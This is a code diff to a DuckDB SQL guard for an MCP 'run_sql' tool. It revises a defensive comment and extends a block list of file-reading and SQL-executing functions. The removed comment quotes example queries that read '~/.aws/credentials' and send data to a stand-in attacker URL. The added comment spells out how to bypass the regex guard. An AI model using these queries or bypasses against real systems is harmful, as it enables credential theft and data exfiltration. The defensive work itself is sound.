@@ -20,19 +20,24 @@ import {
 
 const MAX_LIMIT = 500;
 
-// DuckDB runs with full external access (it has to read the local Parquet that
-// backs the `costs` table), so an arbitrary SELECT can otherwise read any file
-// on disk or reach the network — e.g. `read_text('~/.aws/credentials')` or
-// `read_csv('http://attacker/?d=' || (SELECT ...))`. run_sql is meant to query
-// the provided `costs` table only, so reject the ways a SELECT can touch
-// files, the network, or evaluate further SQL.
+// NOT the load-bearing control. The desktop app runs every MCP query on a
+// dedicated DuckDB instance that is sandboxed to the workspace data and
+// configuration-locked (#594, `buildDuckDbSandboxStatements`); that sandbox is
+// what stops run_sql reading `~/.aws/credentials`, writing files or reaching the
+// network. This regex guard is kept only as defence in depth and as an early,
+// friendlier error for the obvious cases. It is known to be bypassable: the
+// scrubber below understands only `'` strings and `--` / `/* */` comments, so a
+// double-quoted identifier containing `'` desyncs it (hiding a call or a `;`
+// from the single-statement check), a quoted function name (`"read_text"(`)
+// dodges the name patterns, and a comma join onto a string path skips the
+// FROM/JOIN check. Do not rely on it, and do not grow it into a parser.
 const BLOCKED_FUNCTIONS = [
   'read_csv', 'read_csv_auto', 'read_parquet', 'parquet_scan',
   'parquet_metadata', 'parquet_schema', 'parquet_file_metadata', 'parquet_kv_metadata',
   'read_json', 'read_json_auto', 'read_json_objects', 'read_json_objects_auto',
   'read_ndjson', 'read_ndjson_auto', 'read_ndjson_objects',
   'read_text', 'read_blob', 'sniff_csv', 'glob',
-  'query', 'query_table',
+  'query', 'query_table', 'json_execute_serialized_sql',
   'iceberg_scan', 'iceberg_metadata', 'iceberg_snapshots', 'delta_scan',
   'postgres_scan', 'postgres_query', 'mysql_scan', 'mysql_query',
   'sqlite_scan', 'sqlite_query',
